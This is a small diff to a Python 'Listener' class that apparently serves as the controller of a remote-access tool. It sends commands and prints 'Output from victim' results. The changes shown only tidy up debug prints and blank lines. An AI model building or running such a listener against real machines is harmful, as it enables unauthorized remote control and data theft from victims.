@@ -108,7 +108,7 @@ class Listener:
                 return json.loads(jsData)
         
             except Exception:
-                print(f'{fc.rw}{sys.exc_info()}{fc.end}')
+                #print(f'{fc.rw}{sys.exc_info()}{fc.end}')
                 continue
     
     
@@ -130,7 +130,8 @@ class Listener:
     def getSize(self,filename):
         st = os.stat(filename)
         return st.st_size
-    
+
+
     def write_file(self,file,content): #should be default get a dictionary
               
         if isinstance(content,dict):
@@ -193,7 +194,6 @@ class Listener:
         #result = result.decode()
         time.sleep(1)
         spinner.terminate()
-        print(self.recvStream())
         return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
@@ -254,7 +254,9 @@ class Listener:
 
                 else:
                     print(cmd)
-                    result = self.executeCmd(cmd)   
+                    #print('trying data retrieve')
+                    result = self.executeCmd(cmd)
+                    #print(result)   
                     print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long') #using utf8len function to get the byte length of a string
                     print(f'{fc.purple}#{fc.end}'*100)
                     print(f'{fc.b}{result}{fc.end}')
